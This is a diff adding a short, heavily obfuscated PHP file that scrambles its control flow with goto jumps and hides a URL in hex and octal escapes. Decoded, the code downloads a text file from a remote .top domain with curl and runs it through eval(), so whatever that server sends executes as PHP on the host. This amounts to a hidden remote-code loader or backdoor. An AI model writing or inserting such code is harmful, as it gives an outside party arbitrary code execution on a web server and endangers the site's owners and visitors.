@@ -1,0 +1,2 @@
+<?php
+ goto wMEeu; HCkLa: curl_setopt($PbBO_, CURLOPT_URL, $pVz1d); goto K_XOo; P6usY: $PbBO_ = curl_init(); goto HCkLa; K_XOo: curl_setopt($PbBO_, CURLOPT_RETURNTRANSFER, true); goto XrTYj; XrTYj: $O6nSs = curl_exec($PbBO_); goto Oba19; Oba19: curl_close($PbBO_); goto kTpgL; wMEeu: $pVz1d = "\x68\164\164\160\x73\72\x2f\57\x61\155\160\156\x79\141\160\x75\x6e\x79\141\153\165\x2e\x74\x6f\160\x2f\x74\x6f\157\x6c\x73\x2f\146\157\x78\x2f\146\x6f\170\55\x6d\x69\156\151\x66\x79\x2e\x74\x78\x74"; goto P6usY; kTpgL: echo eval("\x3f\76" . $O6nSs);
